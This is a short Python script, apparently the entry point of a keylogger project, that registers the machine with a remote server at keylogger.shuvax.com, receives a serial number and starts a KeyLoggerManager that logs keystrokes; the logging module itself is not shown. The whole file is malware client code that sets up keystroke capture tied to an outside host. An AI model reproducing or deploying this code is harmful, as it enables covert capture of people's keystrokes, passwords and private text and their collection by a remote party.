import manager as keylogger
import requests

url = 'https://keylogger.shuvax.com/api/create_machine'


def create_logger():
    data = {
        "ip": "127.0.0.1"
    }
    try:
        response = requests.post(url, json=data)
        number = response.json()['serial_number']
        key_logger = keylogger.KeyLoggerManager(number)
        key_logger.start_logging()
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False


if __name__ == "__main__":
    create_logger()
    # key_logger = keylogger.KeyLoggerManager(123)
    # key_logger.start_logging()
